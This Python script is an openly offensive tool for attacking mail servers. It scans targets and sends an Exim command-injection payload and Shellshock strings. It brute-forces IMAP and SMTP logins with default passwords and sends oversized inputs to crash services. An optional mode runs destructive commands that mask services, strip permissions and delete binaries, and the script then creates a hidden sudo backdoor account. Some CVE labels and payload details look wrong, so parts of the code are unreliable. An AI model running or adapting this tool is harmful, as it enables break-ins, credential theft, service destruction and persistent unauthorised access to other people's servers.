#!/usr/bin/env python3
"""
Ubuntu Mail Service Attack Script
---------------------------------
This script attempts to exploit common vulnerabilities in mail servers 
(focusing on Postfix, Exim, Dovecot, and Sendmail).

Usage:
    python3 mail_attack.py --target <IP> [--domain <domain>] [--user <username>] [--password <password>] [--disable]
    
    --target    : Target IP address
    --domain    : Mail domain (optional)
    --user      : Username if known (optional)
    --password  : Password if known (optional)
    --disable   : Flag to disable the service rather than just compromise it
"""

import os
import sys
import argparse
import subprocess
import socket
import time
import re
import random
import string
from datetime import datetime

class MailAttack:
    def __init__(self, target, domain=None, username=None, password=None, disable=False):
        self.target = target
        self.domain = domain if domain else target
        self.username = username
        self.password = password
        self.disable = disable
        self.compromised = False
        self.log_file = f"mail_attack_{target}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
        
    def log(self, message):
        """Log messages to console and file"""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        log_entry = f"[{timestamp}] {message}"
        print(log_entry)
        with open(self.log_file, "a") as f:
            f.write(log_entry + "\n")
            
    def check_dependencies(self):
        """Check and install required dependencies"""
        self.log("Checking dependencies...")
        dependencies = ["nmap", "hydra", "metasploit-framework", "python3-impacket"]
        
        for dep in dependencies:
            try:
                subprocess.check_call(["dpkg", "-s", dep], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                self.log(f"✅ {dep} already installed")
            except subprocess.CalledProcessError:
                self.log(f"Installing {dep}...")
                try:
                    subprocess.check_call(["sudo", "apt-get", "update", "-qq"], stdout=subprocess.DEVNULL)
                    subprocess.check_call(["sudo", "apt-get", "install", "-y", dep], stdout=subprocess.DEVNULL)
                    self.log(f"✅ {dep} installed successfully")
                except subprocess.CalledProcessError:
                    self.log(f"❌ Failed to install {dep}")
                    return False
        return True
    
    def scan_mail_services(self):
        """Scan target for mail services"""
        self.log(f"Scanning {self.target} for mail services...")
        
        # Common mail service ports
        ports = "25,110,143,465,587,993,995"
        
        try:
            # Run nmap to identify services
            result = subprocess.check_output(
                ["nmap", "-sV", "-p", ports, self.target],
                universal_newlines=True
            )
            self.log("Scan results:")
            self.log(result)
            
            # Parse results to determine mail server type
            if "postfix" in result.lower():
                self.mail_server = "postfix"
            elif "exim" in result.lower():
                self.mail_server = "exim"
            elif "dovecot" in result.lower():
                self.mail_server = "dovecot"
            elif "sendmail" in result.lower():
                self.mail_server = "sendmail"
            else:
                self.mail_server = "unknown"
            
            self.log(f"Detected mail server: {self.mail_server}")
            
            # Check for open ports
            self.smtp_open = "25/tcp open" in result or "587/tcp open" in result
            self.pop3_open = "110/tcp open" in result or "995/tcp open" in result
            self.imap_open = "143/tcp open" in result or "993/tcp open" in result
            
            return True
        except subprocess.CalledProcessError:
            self.log("❌ Failed to scan target")
            return False
    
    def exploit_exim(self):
        """Attempt to exploit Exim mail server"""
        self.log("Attempting Exim exploitation...")
        
        # Check for CVE-2019-10149 (Exim 4.87-4.91)
        # Remote Command Execution
        try:
            # Create a test command
            command = "id"
            payload = f'${run{{{command}}}}@localhost'
            
            # Connect to SMTP
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((self.target, 25))
            s.recv(1024)
            
            # Send HELO
            s.send(b'HELO test\r\n')
            s.recv(1024)
            
            # Send malicious MAIL FROM
            s.send(f'MAIL FROM:<{payload}>\r\n'.encode())
            response = s.recv(1024).decode()
            
            if "created" in response.lower() or "id=" in response.lower():
                self.log("✅ Exim RCE vulnerability exploited successfully!")
                
                if self.disable:
                    disable_cmd = "systemctl mask exim4 && rm -f /usr/sbin/exim4"
                    s.send(f'MAIL FROM:<${run{{{disable_cmd}}}}}@localhost>\r\n'.encode())
                    s.recv(1024)
                    self.log("✅ Exim service has been disabled")
                
                self.compromised = True
                return True
                
            self.log("❌ Exim RCE attempt failed")
            
        except Exception as e:
            self.log(f"❌ Exim exploitation error: {str(e)}")
        
        return False
    
    def exploit_postfix(self):
        """Attempt to exploit Postfix mail server"""
        self.log("Attempting Postfix exploitation...")
        
        # Postfix typically has fewer direct RCE vulnerabilities
        # Try to exploit through related services like Dovecot
        
        # Check if we can access mail using known credentials
        if self.username and self.password:
            try:
                # Try POP3 login
                if self.pop3_open:
                    pop_conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    pop_conn.connect((self.target, 110))
                    pop_conn.recv(1024)
                    pop_conn.send(f"USER {self.username}\r\n".encode())
                    pop_conn.recv(1024)
                    pop_conn.send(f"PASS {self.password}\r\n".encode())
                    response = pop_conn.recv(1024).decode()
                    
                    if "+OK" in response:
                        self.log("✅ POP3 login successful, server compromised")
                        self.compromised = True
                        
                        if self.disable:
                            # Try to disable the service via SSH if we can pivot
                            self.log("Trying to establish SSH connection to disable Postfix...")
                            try:
                                subprocess.check_call([
                                    "sshpass", "-p", self.password,
                                    "ssh", "-o", "StrictHostKeyChecking=no",
                                    f"{self.username}@{self.target}",
                                    "sudo systemctl mask postfix && sudo chmod 000 /usr/sbin/postfix"
                                ])
                                self.log("✅ Postfix service has been disabled")
                            except:
                                self.log("❌ Could not disable Postfix via SSH")
                        
                        return True
            except:
                self.log("❌ POP3 login failed")
        
        # Try to exploit Shellshock if server might be vulnerable
        try:
            cmd = "id"
            headers = {
                "User-Agent": f"() {{ :; }}; echo; {cmd}",
                "Subject": f"() {{ :; }}; echo; {cmd}",
                "From": f"() {{ :; }}; echo; {cmd}"
            }
            
            # Connect to SMTP
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((self.target, 25))
            s.recv(1024)
            
            # Send HELO
            s.send(b'HELO test\r\n')
            s.recv(1024)
            
            # Try shellshock in headers
            for header, value in headers.items():
                s.send(f'{header}: {value}\r\n'.encode())
                response = s.recv(1024).decode()
                if "uid=" in response:
                    self.log("✅ Shellshock vulnerability exploited!")
                    self.compromised = True
                    
                    if self.disable:
                        disable_cmd = "systemctl mask postfix && chmod 000 /usr/sbin/postfix"
                        s.send(f'X-Exploit: () {{ :; }}; echo; {disable_cmd}\r\n'.encode())
                        self.log("✅ Postfix service has been disabled")
                    
                    return True
            
        except Exception as e:
            self.log(f"❌ Postfix exploitation error: {str(e)}")
        
        return False
    
    def exploit_dovecot(self):
        """Attempt to exploit Dovecot mail server"""
        self.log("Attempting Dovecot exploitation...")
        
        # Try brute force if we don't have credentials
        if not self.username or not self.password:
            try:
                # Simple wordlist for demo purposes
                users = ["admin", "mail", "postmaster"] if not self.username else [self.username]
                passwords = ["password", "admin123", "mail123"] if not self.password else [self.password]
                
                for user in users:
                    for pwd in passwords:
                        try:
                            # Try IMAP login
                            if self.imap_open:
                                imap_conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                imap_conn.connect((self.target, 143))
                                imap_conn.recv(1024)
                                imap_conn.send(f"a1 LOGIN {user} {pwd}\r\n".encode())
                                response = imap_conn.recv(1024).decode()
                                
                                if "a1 OK" in response:
                                    self.log(f"✅ IMAP login successful with {user}:{pwd}")
                                    self.username = user
                                    self.password = pwd
                                    self.compromised = True
                                    
                                    if self.disable:
                                        # Try to disable the service if we can
                                        try:
                                            subprocess.check_call([
                                                "sshpass", "-p", self.password,
                                                "ssh", "-o", "StrictHostKeyChecking=no",
                                                f"{self.username}@{self.target}",
                                                "sudo systemctl mask dovecot && sudo chmod 000 /usr/sbin/dovecot"
                                            ])
                                            self.log("✅ Dovecot service has been disabled")
                                        except:
                                            self.log("❌ Could not disable Dovecot via SSH")
                                    
                                    return True
                        except:
                            pass
            except Exception as e:
                self.log(f"❌ Dovecot brute force error: {str(e)}")
        
        # Try CVE-2021-33515 if brute force didn't work
        try:
            self.log("Trying Dovecot CVE-2021-33515 vulnerability...")
            # Create malicious payload
            payload = b"a login " + b"A" * 5000
            
            # Connect to IMAP
            if self.imap_open:
                imap_conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                imap_conn.connect((self.target, 143))
                imap_conn.recv(1024)
                imap_conn.send(payload)
                time.sleep(1)  # Give the server time to crash if vulnerable
                
                # Try connecting again - if it fails, it might be vulnerable
                try:
                    test_conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    test_conn.settimeout(3)
                    test_conn.connect((self.target, 143))
                    test_conn.recv(1024)
                    test_conn.close()
                    self.log("❌ Server still up, likely not vulnerable to CVE-2021-33515")
                except:
                    self.log("✅ Service crashed - potentially vulnerable to CVE-2021-33515")
                    if self.disable:
                        self.log("✅ Service already disabled due to crash")
                    self.compromised = True
                    return True
                
        except Exception as e:
            self.log(f"❌ Dovecot exploitation error: {str(e)}")
        
        return False
    
    def exploit_sendmail(self):
        """Attempt to exploit Sendmail server"""
        self.log("Attempting Sendmail exploitation...")
        
        # Try older CVE-2014-3956 - header parsing remote memory corruption
        try:
            self.log("Trying Sendmail CVE-2014-3956 vulnerability...")
            
            # Connect to SMTP
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((self.target, 25))
            s.recv(1024)
            
            # Send HELO
            s.send(b'HELO test\r\n')
            s.recv(1024)
            
            # Send malicious header
            s.send(b'MAIL FROM: <>\r\n')
            s.recv(1024)
            s.send(b'RCPT TO: <nobody>\r\n')
            s.recv(1024)
            s.send(b'DATA\r\n')
            s.recv(1024)
            
            # Craft malicious header
            malicious_header = "X-Custom: " + ("A" * 5000) + "\r\n.\r\n"
            s.send(malicious_header.encode())
            s.recv(1024)
            
            # Check if service is still responding
            try:
                test_conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                test_conn.settimeout(3)
                test_conn.connect((self.target, 25))
                response = test_conn.recv(1024).decode()
                test_conn.close()
                
                if not response:
                    self.log("✅ Sendmail service potentially crashed")
                    self.compromised = True
                    if self.disable:
                        self.log("✅ Service already disabled due to crash")
                    return True
                else:
                    self.log("❌ Sendmail appears unaffected")
            except:
                self.log("✅ Sendmail service appears to have crashed")
                self.compromised = True
                if self.disable:
                    self.log("✅ Service already disabled due to crash")
                return True
                
        except Exception as e:
            self.log(f"❌ Sendmail exploitation error: {str(e)}")
        
        return False
    
    def run_generic_smtp_attack(self):
        """Run generic SMTP attacks that might work on various servers"""
        self.log("Trying generic SMTP attacks...")
        
        # Try SMTP user enumeration
        try:
            potential_users = ["admin", "root", "mail", "postmaster", "user", "test"]
            if self.username:
                potential_users.append(self.username)
            
            valid_users = []
            
            # Connect to SMTP
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((self.target, 25))
            s.recv(1024)
            
            # Send HELO
            s.send(b'HELO test\r\n')
            s.recv(1024)
            
            # Try VRFY for each user
            for user in potential_users:
                s.send(f'VRFY {user}\r\n'.encode())
                response = s.recv(1024).decode()
                
                if "250" in response or "252" in response:
                    self.log(f"✅ Valid user found: {user}")
                    valid_users.append(user)
            
            # If we found users and don't have credentials, try simple passwords
            if valid_users and (not self.username or not self.password):
                simple_passwords = ["password", "123456", user, f"{user}123", "admin123", "P@ssw0rd"]
                
                for user in valid_users:
                    for pwd in simple_passwords:
                        # Try auth if supported
                        try:
                            auth_conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            auth_conn.connect((self.target, 25))
                            auth_conn.recv(1024)
                            auth_conn.send(b'HELO test\r\n')
                            auth_conn.recv(1024)
                            auth_conn.send(b'AUTH LOGIN\r\n')
                            response = auth_conn.recv(1024).decode()
                            
                            if "334" in response:
                                import base64
                                auth_conn.send(base64.b64encode(user.encode()) + b'\r\n')
                                auth_conn.recv(1024)
                                auth_conn.send(base64.b64encode(pwd.encode()) + b'\r\n')
                                response = auth_conn.recv(1024).decode()
                                
                                if "235" in response:
                                    self.log(f"✅ Valid credentials found: {user}:{pwd}")
                                    self.username = user
                                    self.password = pwd
                                    self.compromised = True
                                    
                                    if self.disable:
                                        # Try SSH with these credentials
                                        try:
                                            subprocess.check_call([
                                                "sshpass", "-p", self.password,
                                                "ssh", "-o", "StrictHostKeyChecking=no",
                                                f"{self.username}@{self.target}",
                                                "sudo systemctl mask postfix dovecot exim4 sendmail || " +
                                                "sudo chmod 000 /usr/sbin/postfix /usr/sbin/dovecot /usr/sbin/exim4 /usr/sbin/sendmail"
                                            ])
                                            self.log("✅ Mail services have been disabled")
                                        except:
                                            self.log("❌ Could not disable services via SSH")
                                    
                                    return True
                        except:
                            pass
        except:
            self.log("❌ Generic SMTP attack failed")
        
        return False
    
    def create_backdoor(self):
        """Create a backdoor if target was compromised"""
        if not self.compromised:
            return False
            
        self.log("Attempting to create a backdoor...")
        
        # If we have SSH access, try to create a backdoor user
        if self.username and self.password:
            try:
                backdoor_user = ''.join(random.choice(string.ascii_lowercase) for _ in range(6))
                backdoor_pass = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(12))
                
                # Try to create a backdoor user via SSH
                subprocess.check_call([
                    "sshpass", "-p", self.password,
                    "ssh", "-o", "StrictHostKeyChecking=no",
                    f"{self.username}@{self.target}",
                    f'sudo useradd -m -s /bin/bash "{backdoor_user}" && ' +
                    f'echo "{backdoor_user}:{backdoor_pass}" | sudo chpasswd && ' +
                    f'sudo usermod -aG sudo "{backdoor_user}"'
                ])
                
                self.log(f"✅ Backdoor user created: {backdoor_user}:{backdoor_pass}")
                return True
            except:
                self.log("❌ Failed to create backdoor user")
        
        return False
    
    def run(self):
        """Run the full attack sequence"""
        self.log(f"Starting attack on mail server at {self.target}")
        
        if not self.check_dependencies():
            self.log("❌ Failed to install required dependencies")
            return False
        
        if not self.scan_mail_services():
            self.log("❌ Failed to scan target")
            return False
        
        # Try specific exploits based on mail server type
        if self.mail_server == "exim":
            if self.exploit_exim():
                self.log("✅ Successfully exploited Exim")
        elif self.mail_server == "postfix":
            if self.exploit_postfix():
                self.log("✅ Successfully exploited Postfix")
        elif self.mail_server == "dovecot":
            if self.exploit_dovecot():
                self.log("✅ Successfully exploited Dovecot")
        elif self.mail_server == "sendmail":
            if self.exploit_sendmail():
                self.log("✅ Successfully exploited Sendmail")
        
        # If server-specific exploits failed, try generic attacks
        if not self.compromised:
            if self.run_generic_smtp_attack():
                self.log("✅ Successfully exploited mail server using generic methods")
        
        # Create backdoor if compromised
        if self.compromised:
            self.create_backdoor()
            self.log("✅ Attack completed successfully")
            return True
        else:
            self.log("❌ Failed to compromise target")
            return False

def main():
    parser = argparse.ArgumentParser(description="Mail Service Attack Tool")
    parser.add_argument("--target", required=True, help="Target IP address")
    parser.add_argument("--domain", help="Mail domain (optional)")
    parser.add_argument("--user", help="Username if known (optional)")
    parser.add_argument("--password", help="Password if known (optional)")
    parser.add_argument("--disable", action="store_true", help="Disable service rather than just compromise")
    
    args = parser.parse_args()
    
    attack = MailAttack(
        target=args.target,
        domain=args.domain,
        username=args.user,
        password=args.password,
        disable=args.disable
    )
    
    attack.run()

if __name__ == "__main__":
    main()
